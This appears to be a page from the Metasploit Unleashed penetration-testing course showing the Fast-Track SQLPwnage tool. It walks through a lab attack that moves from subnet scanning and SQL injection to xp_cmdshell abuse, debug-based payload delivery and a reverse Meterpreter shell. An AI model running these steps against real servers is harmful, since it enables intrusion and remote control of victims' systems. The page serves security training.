<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>SQL Pwnage</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">SQL
Pwnage</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">SQLPwnage is an insane tool for
detecting potential SQL Injection
vulnerabilities within a web application. SQLPwnage will scan subnets
and crawl entire URLs looking for any type of POST parameters.
SQLPwnage will try both Error and Blind based SQL Injection in an
attempt to gain full access to the system. If it can guess the proper
SQL Syntax, it will do a series of attacks including re-enabling
xp_cmdshell and delivering whatever payload you want, all through SQL
Injection. Using the example below, we will automatically crawl and
attack a site we know is vulnerable to SQL Injection. SQLPwnage was
written by Andrew Weidenhamer and David Kennedy. Let's see what
happens.
<br>
<br>
</p>
<pre id="code">Fast-Track Main Menu:<br><br>        1.  Fast-Track Updates<br>        2.  Autopwn Automation<br>        3.  Nmap Scripting Engine<br>        4.  Microsoft SQL Tools<br>        5.  Mass Client-Side Attack<br>        6.  Exploits<br>        7.  Binary to Hex Payload Converter<br>        8.  Payload Generator<br>        9.  Fast-Track Tutorials<br>        10. Fast-Track Changelog<br>        11. Fast-Track Credits<br>        12. Exit Fast-Track<br><br>        Enter the number: 4<br><br><br>    Microsoft SQL Attack Tools<br><br>        1. MSSQL Injector<br>        2. MSSQL Bruter<br>        3. SQLPwnage<br><br>        (q)uit<br><br>        Enter your choice : 3<br><br>    Checking SQLPwnage dependencies required to run...<br><br>    Dependencies installed. Welcome to SQLPwnage.<br><br>    Psyco not detected....Recommend installing it for increased speeds.<br><br><br>    SQLPWnage written by: Andrew Weidenhamer and David Kennedy<br><br>    SQLPwnage is a mass pwnage tool custom coded for Fast-Track. SQLPwnage will attempt<br>    to identify SQL Injection in a website, scan subnet ranges for web servers, crawl entire<br>    sites, fuzz form parameters and attempt to gain you remote access to a system. We use<br>    unique attacks never performed before in order to bypass the 64kb debug restrictions<br>    on remote Windows systems and deploy our large payloads without restrictions.<br><br>    This is all done without a stager to download remote files, the only egress connections<br>    made are our final payload. Right now SQLPwnage supports three payloads, a reverse<br>    tcp shell, metasploit reverse tcp meterpreter, and metasploit reverse vnc inject.<br><br>    Some additional features are, elevation to "sa" role if not added, data execution prevention<br>    (DEP) disabling, anti-virus bypassing, and much more!<br><br>    This tool is the only one of its kind, and is currently still in beta.<br><br>    SQLPwnage Main Menu:<br><br>    1. SQL Injection Search/Exploit by Binary Payload Injection (BLIND)<br>    2. SQL Injection Search/Exploit by Binary Payload Injection (ERROR BASED)<br>    3. SQL Injection single URL exploitation<br><br>    -c to Cancel<br><br>    Enter your choice: 2<br><br>---------------------------------------------------------------<br>- This module has the following two options: -<br>- -<br>- 1) Spider a single URL looking for SQL Injection. If -<br>- successful in identifying SQL Injection, it will then -<br>- give you a choice to exploit.-<br>- -<br>- 2) Scan an entire subnet looking for webservers running on -<br>- port 80. The user will then be prompted with two -<br>- choices: 1) Select a website or, 2) Attempt to spider -<br>- all websites that was found during the scan attempting -<br>- to identify possible SQL Injection. If SQL Injection -<br>- is identified, the user will then have an option to -<br>- exploit. -<br>- -<br>- This module is based on error messages that are most -<br>- commonly returned when SQL Injection is prevalent on -<br>- web application. -<br>- -<br>- If all goes well a reverse shell will be returned back to -<br>- the user. -<br>---------------------------------------------------------------<br><br>Scan a subnet or spider single URL?<br><br>1. url<br>2. subnet (new)<br>3. subnet (lists last scan)<br><br>Enter the Number: 2<br><br>Enter the ip range, example 192.168.1.1-254: 10.211.55.1-254<br>Scanning Complete!!! Select a website to spider or spider all??<br><br>1. Single Website<br>2. All Websites<br><br>Enter the Number: 2<br><br>Attempting to Spider: http://10.211.55.128<br>Crawling http://10.211.55.128 (Max Depth: 100000)<br>DONE<br>Found 0 links, following 0 urls in 0+0:0:0<br><br>Spidering is complete.<br><br>*************************************************************************<br>http://10.211.55.128<br>*************************************************************************<br><br><br>[+] Number of forms detected: 2 [+]<br><br>A SQL Exception has been encountered in the "txtLogin" input field of the above website.<br><br>What type of payload do you want?<br><br>1. Custom Packed Fast-Track Reverse Payload (AV Safe)<br>2. Metasploit Reverse VNC Inject (Requires Metasploit)<br>3. Metasploit Meterpreter Payload (Requires Metasploit)<br>4. Metasploit TCP Bind Shell (Requires Metasploit)<br>5. Metasploit Meterpreter Reflective Reverse TCP<br>6. Metasploit Reflective Reverse VNC<br><br>Select your choice: 5<br>Enter the port you want to listen on: 9090<br>[+] Importing 64kb debug bypass payload into Fast-Track... [+]<br>[+] Import complete, formatting the payload for delivery.. [+]<br>[+] Payload Formatting prepped and ready for launch. [+]<br>[+] Executing SQL commands to elevate account permissions. [+]<br>[+] Initiating stored procedure: 'xp_cmdhshell' if disabled. [+]<br>[+] Delivery Complete. [+]<br>Created by msfpayload (http://www.metasploit.com).<br>Payload: windows/patchupmeterpreter/reverse_tcp<br>Length: 310<br>Options: LHOST=10.211.55.130,LPORT=9090<br>Launching MSFCLI Meterpreter Handler<br>Creating Metasploit Reverse Meterpreter Payload..<br>Taking raw binary and converting to hex.<br>Raw binary converted to straight hex.<br>[+] Bypassing Windows Debug 64KB Restrictions. Evil. [+]<br>[+] Sending chunked payload. Number 1 of 9. This may take a bit. [+]<br>[+] Sending chunked payload. Number 2 of 9. This may take a bit. [+]<br>[+] Sending chunked payload. Number 3 of 9. This may take a bit. [+]<br>[+] Sending chunked payload. Number 4 of 9. This may take a bit. [+]<br>[+] Sending chunked payload. Number 5 of 9. This may take a bit. [+]<br>[+] Sending chunked payload. Number 6 of 9. This may take a bit. [+]<br>[+] Sending chunked payload. Number 7 of 9. This may take a bit. [+]<br>[+] Sending chunked payload. Number 8 of 9. This may take a bit. [+]<br>[+] Sending chunked payload. Number 9 of 9. This may take a bit. [+]<br>[+] Conversion from hex to binary in progress. [+]<br>[+] Conversion complete. Moving the binary to an executable. [+]<br>[+] Splitting the hex into 100 character chunks [+]<br>[+] Split complete. [+]<br>[+] Prepping the payload for delivery. [+]<br>Sending chunk 1 of 3, this may take a bit...<br>Sending chunk 2 of 3, this may take a bit...<br>Sending chunk 3 of 3, this may take a bit...<br>Using H2B Bypass to convert our Payload to Binary..<br>Running cleanup before launching the payload....<br>[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]<br>[*] Please wait while we load the module tree...<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...<br>[*] Transmitting intermediate stager for over-sized stage...(216 bytes)<br>[*] Sending stage (2650 bytes)<br>[*] Sleeping before handling stage...<br>[*] Uploading DLL (718347 bytes)...<br>[*] Upload completed.<br>[*] Meterpreter session 1 opened (10.211.55.130:9090 -&gt; 10.211.55.128:1031)<br><br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Phew! Made that look easy...
Fast-Track has successfully gained
access and delivered the payload all through SQL Injection! What is
interesting about all of this is how the actual payload got delivered.
Once Fast-Track identifies SQL Injection, it takes the options
specified during the initial setup and creates a Metasploit Payload as
an executable format. That executable is then converted into a raw hex
version, so the output is just a straight blob of hex. A custom payload
is delivered to the victim machine that is completely custom to
Fast-Track, what this initial payload does is its a 5kb hex based
application, it drops the payload in the hex format on the underlying
operating system and uses Windows debug to convert the hex format back
to a binary based application. The main limitation with this method is
that all payloads MUST be under 64KB in size. If the payload is over
the size, it will bomb out and not convert the application.
Fast-Track's custom payload (5kb) essentially once converted back to a
binary reads in raw hex and spits it to a file in a binary format, thus
bypassing the 64KB restriction. This method was first introduced by
Scott White at SecureState at Defcon in 2008 and is incorporated into
the Fast-Track SQLPwnage and SQLBruter attacks.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Fast-Track"
 title="Fast-Track">Fast-Track</a></div>
</body>
</html>
